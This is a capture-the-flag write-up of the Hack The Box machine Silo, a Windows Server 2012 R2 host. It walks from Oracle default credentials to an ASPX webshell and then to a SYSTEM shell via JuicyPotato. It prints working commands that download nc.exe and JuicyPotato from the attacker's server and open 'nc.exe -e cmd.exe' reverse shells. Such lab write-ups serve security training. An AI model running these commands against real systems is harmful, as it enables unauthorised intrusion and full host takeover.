# HTB: Silo

**Difficulty:** Medium **OS:** Windows Server 2012 R2 **Target IP:** 10.129.95.188 **Attacker IP:** 10.10.15.146

> Note: I reset the machine partway through this box, which changed the target IP to `10.129.73.80` for the remainder of the exploitation. I've kept `10.129.95.188` as the reference target IP throughout this write-up since that's what recon was performed against, but the later commands (webshell access onward) were run against the post-reset IP.

---

## 1. Reconnaissance

### Port Scanning

I started with a fast port sweep, then followed up with a detailed service scan.

```
rustscan -a 10.129.95.188
```

```
Open 10.129.95.188:80
Open 10.129.95.188:135
Open 10.129.95.188:139
Open 10.129.95.188:445
Open 10.129.95.188:1521
Open 10.129.95.188:5985
Open 10.129.95.188:47001
Open 10.129.95.188:49152-49162
```

```
nmap -p $(cat ports | awk -F "/" '{print $1}' | tr "\n" "," | sed "s/,$//") -sCV 10.129.95.188 -oA nmap/nmap
```

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152-49162/tcp open msrpc   Microsoft Windows RPC
```

The two ports that stood out immediately were **80** (IIS 8.5) and **1521** (Oracle TNS listener). IIS on its own is fairly generic, but an exposed, unauthenticated Oracle TNS listener sitting right next to a web server is a very strong signal — Oracle databases have a well-known history of file-write and command-execution primitives once you have valid credentials, and the web root gives an obvious place to land a payload once you have that access. That combination shaped the entire rest of the approach: enumerate Oracle first, then use whatever access it gives me to reach the web server.

The SMB script output also confirmed message signing was enabled but not required, and the domain was listed as `HTB` rather than an actual Active Directory domain — telling me this box is a standalone server, not domain-joined, so credential attacks against a wider AD environment weren't in scope here.

---

## 2. Oracle Enumeration and Exploitation

### 2.1 Checking for TNS Poisoning

Since the TNS listener was unauthorized (i.e. reachable without credentials for basic listener operations), I checked it against the classic TNS poisoning vulnerability:

```
nmap --script=oracle-tns-poison -p 1521 10.129.95.188
```

```
PORT     STATE SERVICE
1521/tcp open  oracle
|_oracle-tns-poison: Host is vulnerable!
```

This confirmed the listener is old and unpatched (**CVE-2012-1675**), which lined up with the very old TNS version banner from the initial nmap scan. I didn't end up needing this specific CVE for the intrusion path, but it was a useful early signal that this Oracle install has had no meaningful patching, which made me more confident that weak/default credentials were also a realistic possibility.

### 2.2 Brute-Forcing the SID

Oracle listeners are addressed by a Service Identifier (SID) rather than being reachable directly — I needed a valid SID before I could attempt any authentication.

```
nmap -p1521 --script oracle-sid-brute 10.129.95.188
```

```
PORT     STATE SERVICE
1521/tcp open  oracle
| oracle-sid-brute:
|_  XE
```

The SID came back as `XE` — Oracle's free "Express Edition," which strongly suggested a default, largely unconfigured install. Default installs are exactly the kind of target where default credentials are worth trying.

### 2.3 Guessing Valid Credentials

With a valid SID in hand, I used `odat`'s built-in password guesser to brute-force default Oracle account credentials against it:

```
odat passwordguesser -s 10.129.95.188 -p 1521 -d XE
```

```
[+] Valid credentials found: scott/tiger. Continue...
[+] Accounts found on 10.129.95.188:1521/sid:XE:
scott/tiger
```

`scott/tiger` is one of Oracle's oldest and most notorious default credential pairs — it's shipped as a default demo account in many Oracle installs going back decades, and its continued presence here confirmed this database had never been hardened post-install.

### 2.4 Confirming Access via SQL*Plus

I hit a shared-library issue connecting locally with `sqlplus`, which I resolved by pointing `LD_LIBRARY_PATH` at the correct Oracle client libs:

```
export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib:$LD_LIBRARY_PATH
sqlplus 'scott/tiger@//10.129.95.188:1521/XE'
```

This got me an authenticated SQL*Plus session as `scott`, confirming the credentials worked directly against the database — not just accepted by the password-guesser module.

### 2.5 Enumerating Exploitable Modules with ODAT

Rather than manually working out what `scott` could do, I ran ODAT's full module sweep against the authenticated session:

```
odat all -s 10.129.95.188 -d XE -U SCOTT -P tiger --sysdba
```

```
[2.3] UTL_FILE library ? [+] OK
[2.11] External table to read files ? [+] OK
[2.12] External table to execute system commands ? [+] OK
[2.16.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges? [+] OK
```

The critical line here was **`UTL_FILE library ? [+] OK`**, combined with `--sysdba` access. `UTL_FILE` is an Oracle PL/SQL package that lets a database user with sufficient privileges read and write arbitrary files on the underlying **operating system**, not just inside the database — and because I authenticated with `--sysdba` (the highest Oracle privilege level), I had write access to essentially any path on the filesystem, including IIS's web root. That's the whole crux of this box's foothold: Oracle running with SYSDBA-equivalent access on the same host as IIS turns a database credential into arbitrary file write on the web server.

---

## 3. Foothold — ASPX Webshell via UTL_FILE

### 3.1 Writing the Webshell to the IIS Web Root

Using ODAT's `utlfile` module (which wraps `UTL_FILE` for file read/write operations), I wrote a standard ASP.NET command-execution webshell directly into IIS's default web root:

```
odat utlfile \
-s 10.129.95.188 \
-p 1521 \
-d XE \
-U SCOTT \
-P tiger \
--sysdba \
--putFile 'C:\inetpub\wwwroot' cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
```

```
[+] The /usr/share/webshells/aspx/cmdasp.aspx file was created on the C:\inetpub\wwwroot directory on the 10.129.95.188 server like the cmdasp.aspx file
```

It's worth being precise about what this file actually is: `cmdasp.aspx` is **not** a reverse shell by itself. It's an ASP.NET page containing a text box that, when submitted, runs whatever string I type through `cmd.exe /c` on the server and prints the output back to the page. The real value of `UTL_FILE` here wasn't remote code execution directly — it was a **file write primitive**, which I used to plant something IIS would happily execute for me, turning "I can write files" into "I can run commands."

I confirmed the file landed correctly (and, after a machine reset changed my target IP to `10.129.73.80`) by requesting it directly:

```
curl -s http://10.129.73.80/cmdasp.aspx | head -20
```

This returned the webshell's HTML form, confirming it was live and IIS was serving it.

### 3.2 Using the Webshell for Command Execution

`curl` alone isn't enough to actually drive this webshell — ASP.NET WebForms pages like this rely on `__VIEWSTATE`/`__EVENTVALIDATION` hidden fields that get regenerated per-request, so I opened the page in a browser instead and submitted `whoami` through the `txtArg` field. It returned successfully, confirming command execution as the IIS application pool identity.

### 3.3 Turning Command Execution into an Interactive Shell

A one-shot command box is workable but painful for real exploitation, so I used it to stage a proper interactive reverse shell. I served Windows `nc.exe` from a local Python web server:

```
python3 -m http.server 8080
```

Then, through the webshell's command box, had the target pull it down:

```
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.15.146:8080/nc.exe','C:\Windows\Temp\nc.exe')"
```

```
10.129.73.80 - - [27/Aug/2026 15:11:53] "GET /nc.exe HTTP/1.1" 200 -
```

The `200` hit on my Python server confirmed the download succeeded. With `nc.exe` staged, I started a listener on my attacker box and used the webshell one final time to launch it as a reverse shell:

```
rlwrap nc -lvnp 443
```

```
C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.146 443
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.73.80] 49164
Microsoft Windows [Version 6.3.9600]

c:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```

✅ **Foothold obtained** as `iis apppool\defaultapppool` — a low-privileged IIS application pool identity, but a stable interactive shell.

---

## 4. Privilege Escalation — SeImpersonatePrivilege via JuicyPotato

### 4.1 Checking Privileges

```
whoami /priv
```

```
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeImpersonatePrivilege        Impersonate a client after auth...  Enabled
SeCreateGlobalPrivilege       Create global objects               Enabled
```

`SeImpersonatePrivilege` being enabled on a service account is a well-known escalation vector on Windows. IIS application pool identities are routinely granted this privilege legitimately (it's needed for the worker process to impersonate authenticated web clients), but combined with an unpatched, pre-2019 Windows build, it enables the whole **"Potato" family** of local privilege escalation exploits. These abuse Windows' COM/DCOM activation service: a process holding `SeImpersonatePrivilege` can coerce a local NT AUTHORITY\SYSTEM service into authenticating to a rogue OXID resolver they control, capture the resulting SYSTEM token, and impersonate it to launch a new process — all without needing any actual system vulnerability, just this legitimately-granted privilege plus an outdated Windows build that hasn't patched the COM activation flow.

Given the OS fingerprint from `systeminfo` (Server 2012 R2, build 9600, no post-2018 hotfixes present), this box was a strong candidate for **JuicyPotato** specifically, since later Windows builds patched the exact COM behavior it depends on.

### 4.2 Staging JuicyPotato

I served `JuicyPotato.exe` the same way I'd served `nc.exe`, then pulled it onto the target through my existing shell:

```
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.15.146:8080/JuicyPotato.exe','C:\Windows\Temp\jp.exe')"
```

### 4.3 Finding a Working CLSID and Triggering the Exploit

JuicyPotato needs a CLSID (COM class identifier) valid for the target's specific Windows version to have something to coerce into authenticating. I used a CLSID known to work against Server 2012 R2 Datacenter:

```
{4991d34b-80a1-4291-83b6-3328366b9097}
```

My first attempt tried to launch `nc.exe` directly as the impersonated process:

```
C:\Windows\Temp\jp.exe -l 4444 -p C:\Windows\Temp\nc.exe -a "10.10.15.146 4444 -e cmd.exe" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

This reported `CreateProcessWithTokenW OK` and a successful SYSTEM token grab, but no connection ever reached my listener. I confirmed the token acquisition itself was genuinely working by launching `cmd.exe /c whoami > file` instead and finding an `Access is denied` when reading the resulting file back as my low-priv shell — that "denied" was actually a good sign, since it meant the file existed and was owned by SYSTEM, proving JuicyPotato really was executing code as SYSTEM; my callback just wasn't connecting.

The actual fix was in how the payload was invoked. Launching `nc.exe` directly as JuicyPotato's target process is inconsistent under `CreateProcessWithTokenW` — the more reliable pattern is to launch `cmd.exe` as the impersonated process and have that spawn `nc.exe`, matching the environment `cmd.exe` normally sets up for child processes:

```
C:\Windows\Temp\jp.exe -l 4444 -p C:\Windows\system32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.146 4444" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

```
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

With a listener already running:

```
rlwrap nc -lvnp 4444
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.73.80] 49190
Microsoft Windows [Version 6.3.9600]

C:\Windows\system32>whoami
nt authority\system
```

✅ **Full compromise** — `nt authority\system`.

---

## 5. Summary

| Stage | Technique |
|---|---|
| Recon | `rustscan` + `nmap` → IIS 8.5 on port 80, unauthorized Oracle TNS listener on 1521 |
| Oracle enumeration | Confirmed CVE-2012-1675 (TNS poisoning) as a signal of an unpatched install; brute-forced the SID (`XE`) with `oracle-sid-brute` |
| Credential access | `odat passwordguesser` recovered default Oracle credentials `scott/tiger` |
| Privilege confirmation | `odat all --sysdba` confirmed `UTL_FILE` access with SYSDBA rights — arbitrary OS file write |
| Foothold | Used `odat utlfile --putFile` to drop `cmdasp.aspx` into `C:\inetpub\wwwroot`; used the resulting webshell to stage and launch `nc.exe` → reverse shell as `iis apppool\defaultapppool` |
| Privesc | Confirmed `SeImpersonatePrivilege` via `whoami /priv`; exploited it with **JuicyPotato** against an unpatched Server 2012 R2 COM activation flow → SYSTEM |

**Root cause / lessons learned:**

- Default Oracle credentials (`scott/tiger`) should never survive past initial install — this single weak credential was the root of the entire chain.
- Running an Oracle database with SYSDBA-equivalent access on the same host as a web server is dangerous: `UTL_FILE` gave OS-level file write, which is functionally equivalent to remote code execution once there's a web root to write into.
- `SeImpersonatePrivilege` is granted to IIS application pool identities by default for legitimate reasons, but on unpatched, pre-2019 Windows builds it's a direct path to SYSTEM via Potato-family exploits. Patching against the relevant COM activation behavior (or using a build where these tools no longer function) closes this off.
- When a privileged process spawn appears to succeed but a payload doesn't call back, don't assume the exploit failed — verify execution independently (e.g. writing to a file) before troubleshooting the wrong half of the chain.

---

## 6. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `oracle-sid-brute`, `oracle-tns-poison` (nmap NSE scripts) — Oracle SID discovery and vulnerability confirmation
- `odat` (Oracle Database Attacking Tool) — password guessing, privilege enumeration, and `UTL_FILE`-based file write
- `sqlplus` — manual confirmation of Oracle credentials
- `cmdasp.aspx` (from `/usr/share/webshells/aspx/`) — ASP.NET command-execution webshell used as the file-write-to-code-exec bridge
- `nc.exe` — Windows netcat, staged via the webshell for an interactive reverse shell
- **JuicyPotato** — local privilege escalation via `SeImpersonatePrivilege` / COM activation abuse
